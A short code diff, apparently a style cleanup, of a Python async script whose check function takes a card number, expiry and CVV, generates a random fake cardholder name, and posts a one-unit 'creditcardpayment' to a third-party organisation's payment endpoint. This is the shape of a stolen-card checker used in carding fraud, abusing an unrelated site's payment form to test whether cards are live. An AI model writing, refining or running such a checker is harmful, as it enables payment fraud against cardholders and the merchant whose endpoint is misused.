@@ -29,8 +29,8 @@ async def grab():
 
 async def check(CCN, MM, YY, CVV):
     letters = string.ascii_lowercase
-    First = ''.join(random.choice(letters) for i in range(6))
-    Last = ''.join(random.choice(letters) for i in range(6))
+    First = ''.join(random.choice(letters) for _ in range(6))
+    Last = ''.join(random.choice(letters) for _ in range(6))
     Name = f'{First} {Last}'
     async with httpx.AsyncClient(http2=True) as client:
         headers = {
@@ -47,9 +47,9 @@ async def check(CCN, MM, YY, CVV):
             "cardnumber": CCN,
             "ccexp": f"{MM}/{YY[2:]}",
             "cardcvc": CVV,
-            "ammount": int(1),
+            "ammount": 1,
             "cardholdername": Name,
-            "mode": "creditcardpayment"
+            "mode": "creditcardpayment",
         }
         r = await client.post(
             'https://tdwinternationalngo.online/make-payment/ajaxsub.php',
